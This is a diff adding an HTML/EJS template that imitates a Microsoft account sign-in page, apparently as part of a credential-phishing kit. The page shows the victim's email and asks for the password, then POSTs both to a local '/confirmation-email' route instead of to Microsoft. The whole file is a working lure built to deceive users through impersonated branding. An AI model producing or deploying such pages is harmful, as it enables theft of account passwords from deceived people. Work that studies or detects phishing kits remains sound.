@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" href="/stylesheets/output.css">
+    <link rel="stylesheet" href="/stylesheets/input.css">
+    <link rel="stylesheet" href="/stylesheets/style.css">
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600&display=swap");
+      
+      body {
+        background-image: url("/images/ms_bg.svg");
+        background-size: cover;
+        font-family: 'Open Sans', sans-serif;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="flex items-center justify-center h-screen">
+      <div class="max-w-md w-full bg-white shadow-md py-14 px-14">
+        <div class="flex items-center mb-4">
+          <img
+            src="/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+            alt="Logo"
+            class="w-28 h-6 mr-2"
+          />
+        </div>
+        <p class="text-left text-gray-600 mb-6">
+          <span>
+            <img
+              src="/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
+              alt="arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410"
+              class="inline-block cursor-pointer"
+            />
+          </span>
+          <span><%= email %></span>
+        </p>
+        <form action="/confirmation-email" method="POST">
+            <input type="hidden" name="email" value="<%= email %>">
+          <label for="password" class="font-semibold text-2xl">Enter password</label>
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            name="password"
+            class="w-full py-2 mt-3 my-4 text-sm bg-transparent focus:outline-none focus:ring-0 border-b border-gray-300"
+          />
+          <a href="#" class="text-xs hover:underline text-[#0067B8]">Forgot password?</a>
+          <div class="flex">
+              <input
+                type="submit"
+                value="Sign In"
+                class="ml-auto block max-w-max w-full py-1 px-4 mt-4 bg-[#0067B8] text-white cursor-pointer hover:bg-[#005DA6]"
+              />
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
